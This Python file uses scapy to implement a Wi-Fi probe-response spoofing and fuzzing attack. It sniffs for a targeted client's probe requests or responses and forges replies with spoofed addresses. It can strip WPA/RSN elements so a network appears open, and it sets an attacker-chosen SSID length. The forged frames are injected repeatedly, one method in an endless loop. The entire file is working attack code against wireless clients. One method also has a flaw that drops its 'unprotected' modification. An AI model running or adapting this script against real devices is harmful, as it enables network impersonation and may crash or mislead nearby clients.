from datetime import datetime
from scapy.all import *
import random
import time

from utilities import *

OUR_FCS = 1094795585

class ProbeAttack:
	def __init__(self, name, length, isProtected, isVerbose, target, source, monitor, injector):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.isVerbose = isVerbose
		self.target = target
		self.source = source
		self.monitor = monitor
		self.injector = injector
		self.probeResp = None

	def __makeNetworkUnprotected(self, pkt): # remove all the tags of protected in the packet
		pkt.getlayer(Dot11ProbeResp).cap = 0x0100
		try:
			layer = pkt.getlayer(Dot11EltMicrosoftWPA) # if it exists it will show the network protected by a password
			afterLayer = layer.payload # removing explained in depth in the function removeEltLayer
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			pass
		
		try:
			layer = pkt.getlayer(Dot11EltRSN) # removed for extra security
			afterLayer = layer.payload # removing explained in depth in the function removeEltLayer
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			return pkt		
		return pkt
		
	def __fuzzProbeResponse(self, pkt, name, length):
		pkt = removeEltLayer(pkt, 0) # removing the ssid layer
		pkt = pkt / Dot11Elt(ID = 0, len = length, info = name) # appending a new layer with our ssid and ssid length
		return pkt
			
	def __craftProbeResponse(self, pkt):
		afterRequestLayer = pkt.getlayer(Dot11ProbeReq).payload
		pkt.getlayer(Dot11ProbeReq).underlayer.remove_payload()
		pkt = pkt / Dot11ProbeResp(cap = 0x1100) / afterRequestLayer
		pkt.getlayer(Dot11).subtype = 5 # change subtype to 5 means the packet is of type probe response
		
		clientAddress = pkt.getlayer(Dot11).addr2
		apAddress = pkt.getlayer(Dot11).addr1
		pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = clientAddress, self.source, self.source
		pkt.getlayer(Dot11).fcs = OUR_FCS # AAAA in decimal, for easier reading in wireshark
		return pkt
		
	def __handleProbeResponse(self, pkt):
		if pkt.haslayer(Dot11ProbeReq):
			if(pkt.getlayer(Dot11).addr2.lower() != self.target.lower()):
				return
			print('got probe request from the target, crafting a probe response.')
			resp = self.__craftProbeResponse(pkt) 
			if(self.isProtected == False):
				resp = self.__makeNetworkUnprotected(resp)
			for i in range(2):
				resp = self.__fuzzProbeResponse(resp, self.name, self.length)
				sendp(resp, iface = self.injector, verbose = self.isVerbose)
				
	def probeAttackUsingRequest(self):
		sniff(iface = self.monitor, prn = self.__handleProbeResponse)
		while 1:
			time.sleep(1)

	def probeAttackUsingSniffedResponse(self):
		def stopFilter(pkt):
			if(pkt.haslayer(Dot11ProbeResp) and pkt.getlayer(Dot11).addr1.lower() == self.target.lower()): 
				print("Sniffed a probe response frame")
				self.probeResp = pkt
				return True
			return False

		sniff(iface = self.monitor, stop_filter = stopFilter)
		while(self.probeResp == None):
			time.sleep(0.1)
		
		self.probeResp.getlayer(Dot11).addr1, self.probeResp.getlayer(Dot11).addr2, self.probeResp.getlayer(Dot11).addr3 = self.target, self.source, self.source
		self.probeResp.getlayer(Dot11).fcs = OUR_FCS # AAAA in decimal, for easier reading in wireshark
		probeResp = None
		if(self.isProtected == False):
			probeResp = self.__makeNetworkUnprotected(self.probeResp)
		probeResp = self.__fuzzProbeResponse(self.probeResp, self.name, self.length)
		while 1:
			sendp(probeResp, iface = self.injector, verbose = self.isVerbose)
			time.sleep(0.5)
